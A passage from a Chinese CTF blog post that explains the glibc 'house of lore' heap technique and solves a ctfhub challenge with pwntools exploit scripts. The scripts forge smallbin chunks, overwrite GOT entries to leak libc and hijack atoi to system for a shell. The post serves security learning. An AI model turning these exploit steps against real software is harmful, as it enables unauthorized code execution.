src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222195535950.png" alt="image-20250222195535950"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250303174445321.png" alt="image-20250303174445321"></p><ul><li>这时我们再申请一个<code>0x100</code>大小的堆块，由于<code>smallbin</code>中的堆块是<code>先进先出</code>，主要取出的是<code>bins-&gt;bk</code>所指堆块，所以我们就将<code>stack_buffer1</code>处的这个堆块给申请过来了。</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222210844748.png" alt="image-20250222210844748"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222210904519.png" alt="image-20250222210904519"></p><ul><li>这时我们就申请到栈上的数据了，并且我们可以将<code>jackpot</code>的地址写入到栈上了，这时我们就覆盖这个函数的地址为返回地址</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222211156756.png" alt="image-20250222211156756"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222211214582.png" alt="image-20250222211214582"></p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><ul><li>现在就给这个<code>house of lore</code>的利用方式做一个总结。首先<code>house of lore</code>这个堆块的利用方式是针对的是<code>smallbin</code>。</li><li>漏洞利用的条件：<ul><li>需要<code>UAF</code>漏洞，这样才能对<code>smallbin</code>中堆块的<code>bk</code>指针进行修改（如果没有<code>UAF</code>漏洞可以尝试使用<code>off-by-null</code>漏洞尝试使用堆风水，去构造UAF漏洞）</li><li>还需要知道堆地址，这样我们在伪造<code>fake_chunk</code>的时候才能向<code>fake_chunk-&gt;fd</code>指针这个位置写入<code>chunk_adddr</code>从而绕过检查</li><li>可能还需要栈地址或者是其他段地址，这样我们在申请任意堆块内存的时候就可以绕过检查</li></ul></li><li>接下来归纳一下我们需要伪造的堆块的数据有哪些：<ul><li>对于放入<code>smallbin</code>中的堆块<code>victim</code>，我们需要修改其<code>bk</code>指针，修改<code>bk</code>指针为<code>fake_chunk1_addr</code></li><li>对于我们要申请的目标地址<code>fake_chunk1</code>，我们要伪造其<code>fd</code>指针，使得其<code>fd</code>指针指向<code>victim</code>，使得<code>bk</code>指针指向<code>fake_chunk2</code></li><li>对于我们要借助绕过申请目标地址的辅助<code>chunk</code>即<code>fake_chunk2</code>，我们要修改其<code>fd</code>指针为<code>fake_chunk1</code></li></ul></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222212206861.png" alt="image-20250222212206861"></p><h1 id="house-of-lore_level1"><a href="#house-of-lore-level1" class="headerlink" title="house-of-lore_level1"></a>house-of-lore_level1</h1><ul><li>接下尝试写一题，题目来源：<code>ctfhub-house-of-lore</code></li></ul><h2 id="level_1分析1"><a href="#level-1分析1" class="headerlink" title="level_1分析1"></a>level_1分析1</h2><ul><li>拿到附件后我们就先<code>check</code>一下附件，看看附件开启了什么保护机制。发现没有开<code>PIE</code></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250303161633967.png" alt="image-20250303161633967"></p><ul><li>然后我们再逆向该程序，使用<code>IDA pro</code>，先来查看一下<code>main</code>函数的运行逻辑。<code>main</code>函数的大致逻辑如下：<ul><li>先对输入输出进行初始化</li><li>然后再初始化一个<code>name_message</code></li><li>之后就会进入一个<code>menu</code>的循环之中，这个时候程序会让用户<code>read_int</code>即输入一个选项，这里我们就来归纳一下对应选项的菜单，这里的<code>menu</code>函数就不进去查看了。<ul><li>选项1：<code>add</code>操作</li><li>选项2：<code>edit</code>操作</li><li>选项3：<code>dele</code>操作</li><li>选项4：<code>change name</code>操作</li><li>选项5：<code>change message</code>操作，注意在程序只能调用一次<code>change message</code>，调用完之后再调用就不会调用<code>change message</code>函数了</li><li>选项6：<code>exit</code></li><li>选项其他：<code>Invalid choice</code></li></ul></li></ul></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250303161757140.png" alt="image-20250303161757140"></p><ul><li>以上就是main函数的执行流程，然后我们现在先来查看一下<code>init_message</code>这个函数的功能<ul><li>首先会让用户输入<code>name</code>，<code>name</code>也是一个全局变量</li><li>之后会申请一个堆块保存给全局变量<code>message</code>，申请堆块后会让用户向这个堆块中输入内容</li></ul></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250303163342648.png" alt="image-20250303163342648"></p><ul><li>接下来我们继续安装<code>增删改查</code>的顺序查看每个函数的功能<ul><li>先查看的是<code>add</code>函数，这里出现了一个名为<code>page_list</code>的全局变量，这个全局变量是一个指针数组，存储的是地址，数组里面有<code>7</code>个元素</li><li>如果<code>page_list</code>满了就会输出<code>Full</code>并且结束该函数</li><li>如果没满，就会提示用户输入<code>size</code>，这个<code>size</code>就是之后我们要申请的堆块的大小</li><li>申请完之后，<code>malloc</code>返回的指针就赋值给对应<code>page_list</code>的地方</li><li>之后又出现了一个名为<code>size_list</code>的全局变量，这个全局变量是一个<code>int</code>类型的数组，这个数组存储的是我们所申请的<code>size</code>的值</li></ul></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250303162252136.png" alt="image-20250303162252136"></p><ul><li>之后来查看<code>dele</code>函数，该函数的程序运行逻辑如下：<ul><li>用户首先要选择需要释放的堆块，之后程序会检查这个索引是否合理</li><li>之后释放这个堆块，然后同时将相应的<code>page_list</code>和<code>size_list</code>置零。</li></ul></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250303162743948.png" alt="image-20250303162743948"></p><ul><li>然后查看<code>edit</code>函数，函数逻辑如下：<ul><li>首先要求用户输入要<code>edit</code>堆块的<code>index</code></li><li>然后就使用<code>read</code>向堆块中输入内容，指定输入长度为<code>size_list</code></li></ul></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250303162932389.png" alt="image-20250303162932389"></p><ul><li>然后查看<code>change_name()</code>函数，函数的主要逻辑如下，就是重新向<code>name</code>写入东西</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250303163553032.png" alt="image-20250303163553032"></p><ul><li>再查看<code>change_message()</code>这个函数，函数的具体逻辑如下：<ul><li>首先泄露出这个<code>message</code>的堆地址，然后会释放<code>message</code>所指向的堆块</li><li>然后再让用户输入之后要申请的堆块大小</li><li>申请堆块，<code>malloc</code>的返回值将赋值给<code>buf</code></li><li>之后就是向<code>buf</code>写入内容，长度不能超过我们所申请的。</li><li>之后还会修改<code>message</code>所指向的堆块<strong>注意这里就存在着UAF漏洞</strong></li><li>修改<code>message</code>所指向堆块后就会更新<code>message</code></li></ul></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250303163754402.png" alt="image-20250303163754402"></p><ul><li>逆向该程序的逻辑后，我们找到了漏洞利用的主要地方，这个地方就是在<code>change_message()</code>这个函数中，我们可以利用这个函数进行<strong>UAF漏洞</strong></li><li>我们现在也对全局变量进行一个归纳和汇总：<ul><li><code>name</code>：存储着用户输入的数据，相当于<code>字符数组</code>，长度为<code>0x40</code>大小。</li><li><code>message</code>：是一个指针，指向<code>malloc</code>返回的堆块地址</li><li><code>page_list</code>：是一个指针数组，指向<code>malloc</code>返回的堆块地址，一共有<code>7</code>个元素</li><li><code>size_list</code>：是一个int类型的数组，存储着<code>page_list</code>对应索引申请的堆块大小</li></ul></li></ul><h2 id="level_1分析2"><a href="#level-1分析2" class="headerlink" title="level_1分析2"></a>level_1分析2</h2><ul><li>接下来我们边写脚本，边进行动态调试。根据程序运行逻辑我们编写了如下代码进行交互。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.send(<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        p.send(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">        p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_mesg</span>(<span class="params">size,new_mesg,mesg</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;saved at &#x27;</span>)</span><br><span class="line">        a = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;leak---&gt;&#x27;</span>,a)</span><br><span class="line">        p.send(<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        p.send(new_mesg)</span><br><span class="line">        p.send(mesg)</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;writer:\n&#x27;</span>,payload1)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;book?\n&#x27;</span>,payload2)</span><br><span class="line">add(<span class="number">200</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;11111&#x27;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">heap_addr = change_mesg(<span class="number">200</span>,<span class="string">b&#x27;11&#x27;</span>,<span class="string">b&#x27;22&#x27;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(heap_addr,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----&gt;&#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>根据分析1，我们可以修改<code>释放后的message指向的堆块</code>，接下来我们来查看释放后的堆块会被放在什么<code>bins</code>中。我们会发现这个堆块会被放入<code>smallbins</code>中，这时我们可以<code>read(0, message, 0x10uLL)</code>从而修改这个堆块的<code>fd</code>、<code>bk</code>指针</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250303175040088.png" alt="image-20250303175040088"></p><ul><li>所以这题的考点就是<code>house-of-lore</code>，现在我们就要对堆块进行伪造，从而可以使用<code>malloc</code>申请到任意地址。这里由于我们<code>bss</code>段地址是固定的，并且我们的<code>name</code>变量是可以写的，所以我们就使用<code>name</code>这个数据块伪造堆块，使其绕过检查</li><li>这时我们通过<code>house-of-lore</code>的利用，就可以将这个<code>name</code>的地址申请过来，并且由于之前的实验中的堆块并没有伪造<code>size</code>位，只需要伪造<code>fd</code>、<code>bk</code>即可，所以我们接下来就对其进行伪造。</li><li>首先我们已经将堆块的地址泄露出来了，泄露出来的同时我们要修改处于<code>smallbins</code>中堆块的<code>bk</code>指针。我们先来修改一下</li><li>这时我们修改的堆块就会出现一个问题，就是我们只要修改<code>bk</code>指针，我们会顺手把<code>fd</code>指针也被修改了。<strong>在写这题的时候我有注意到这一点，但是后面发现，在house of lore中修改smallbins中的fd指针貌似不会对这种堆利用方式有什么影响</strong></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250303181232835.png" alt="image-20250303181232835"></p><ul><li><p>查看<code>glibc</code>源码时发现，在<code>malloc</code>中只进行了<code>bck-&gt;fd != victim</code>检查，在<code>free</code>中才对<code>fwd-&gt;bk != bck</code>进行检查，而<code>house-of-lore</code>利用中我们后续并没有再释放堆块，所以并不会调用<code>free</code>，所以并不需要关系<code>fd</code>指针。</p></li><li><p>现在我们就开始进行<code>house-of-lore</code>的堆块伪造，由于之前我们确定<code>name</code>这个<code>.bss</code>段，但是我们只能对<code>.bss</code>这个段写入<code>0x20</code>的数据，所以我们要在利用<code>name-0x10</code>这个字段，伪造<code>fake_chunk1</code>的<code>prevsize</code>和<code>size</code>字段。</p></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250305175004220.png" alt="image-20250305175004220"></p><ul><li>这时我们就通过<code>change_message</code>修改放在<code>smallbin</code>中的<code>chunk</code>。</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250305175353698.png" alt="image-20250305175353698"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250305180018667.png" alt="image-20250305180018667"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;writer:\n&#x27;</span>,payload1)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;book?\n&#x27;</span>,payload2)</span><br><span class="line">add(<span class="number">0xC8</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x6020A0</span>-<span class="number">0x10</span>)</span><br><span class="line">heap_addr = change_mesg(<span class="number">200</span>,<span class="string">b&#x27;11&#x27;</span>,payload)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(heap_addr,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----&gt;&#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure><ul><li>现在我们在修改<code>bk</code>指针的同时就已经把堆地址给泄露出来了。现在我们就可以使用<code>change_name</code>伪造堆块，由于输入字节数的原因，我们就可以进行如下操作，将<code>fake_chunk2</code>与<code>fake_chunk1</code>的<code>bk</code>指针共用一个内存空间。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(heap_addr-<span class="number">0x10</span>)+p64(<span class="number">0x6020A0</span>+<span class="number">0x8</span>)</span><br><span class="line">payload +=p64(<span class="number">0</span>)+p64(<span class="number">0x6020A0</span>-<span class="number">0x10</span>)</span><br><span class="line">change_name(payload)</span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250305180050884.png" alt="image-20250305180050884"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250305180704821.png" alt="image-20250305180704821"></p><ul><li>这时我们再进行两次申请,就可以将<code>name</code>申请回来，并且可以使用<code>edit</code>编辑，编辑到<code>page_list</code>这个数组</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xb0</span>)</span><br><span class="line">add(<span class="number">0xb0</span>)</span><br></pre></td></tr></table></figure><ul><li>这时我们就还差libc地址没有泄露，在做这题的时候一直卡在泄露这块，看了<code>wp</code>才发现，可以这么泄露：<ul><li>我们可以修改我们申请回来的<code>name</code>这个空间溢出到<code>page_list[0]</code>,将这个地址修改为<code>free_got</code>的地址</li><li>然后再修改<code>page_list[1]</code>，将其地址修改为<code>puts_got</code>表</li><li>再一次通过<code>edit</code>修改这时我们修改的时<code>free_got</code>表存储的值，将其改为<code>puts_plt</code>表，这时我们调用</li><li>最后我们再<code>free(page_list[1])</code>，这时传递的是<code>puts_got</code>表的地址，该地址存储着<code>puts</code>的地址</li><li>我们<code>free(page_list[1])</code>实际上是<code>puts(puts_got)</code>，这时我们就泄露了<code>libc</code>的地址</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">puts_got = <span class="number">0x602020</span></span><br><span class="line">atoi_got = <span class="number">0x602060</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(heap_addr+<span class="number">0xb0</span>+<span class="number">0xc0</span>+<span class="number">0xd0</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(free_got)+p64(puts_got)</span><br><span class="line">payload+=p64(atoi_got)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x4006A0</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;delete?\n&#x27;</span>)</span><br><span class="line">puts_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr---&gt;&#x27;</span>,puts_addr)</span><br></pre></td></tr></table></figure><ul><li>最后我们再劫持<code>atoi_got</code>，将其劫持为<code>system</code>的地址，之后我们在<code>read_int</code>的时候直接输入<code>/bin/sh\x00</code>，这样就可以直接<code>getshell</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;delete?\n&#x27;</span>)</span><br><span class="line">puts_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr---&gt;&#x27;</span>,puts_addr)</span><br><span class="line">puts_addr = <span class="built_in">int</span>.from_bytes(puts_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">libc_addr = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="level_1_exp"><a href="#level-1-exp" class="headerlink" title="level_1_exp"></a>level_1_exp</h2><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.send(<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,context</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        p.send(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">        p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_mesg</span>(<span class="params">size,new_mesg,mesg</span>):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;saved at &#x27;</span>)</span><br><span class="line">        a = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;leak---&gt;&#x27;</span>,a)</span><br><span class="line">        heap_addr = <span class="built_in">int</span>(a,<span class="number">16</span>)</span><br><span class="line">        payload = p64(heap_addr+<span class="number">0xb0</span>+<span class="number">0xd0</span>)</span><br><span class="line">        mesg = payload + mesg</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;----&gt;&#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">        p.send(<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        p.send(new_mesg)</span><br><span class="line">        p.send(mesg)</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;writer:\n&#x27;</span>,payload1)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;book?\n&#x27;</span>,payload2)</span><br><span class="line">add(<span class="number">0xC8</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x6020A0</span>-<span class="number">0x10</span>)</span><br><span class="line">heap_addr = change_mesg(<span class="number">200</span>,<span class="string">b&#x27;11&#x27;</span>,payload)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(heap_addr,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----&gt;&#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(heap_addr-<span class="number">0x10</span>)+p64(<span class="number">0x6020A0</span>+<span class="number">0x8</span>)</span><br><span class="line">payload +=p64(<span class="number">0</span>)+p64(<span class="number">0x6020A0</span>-<span class="number">0x10</span>)</span><br><span class="line">change_name(payload)</span><br><span class="line">add(<span class="number">0xb0</span>)</span><br><span class="line">add(<span class="number">0xb0</span>)</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">puts_got = <span class="number">0x602020</span></span><br><span class="line">atoi_got = <span class="number">0x602060</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span 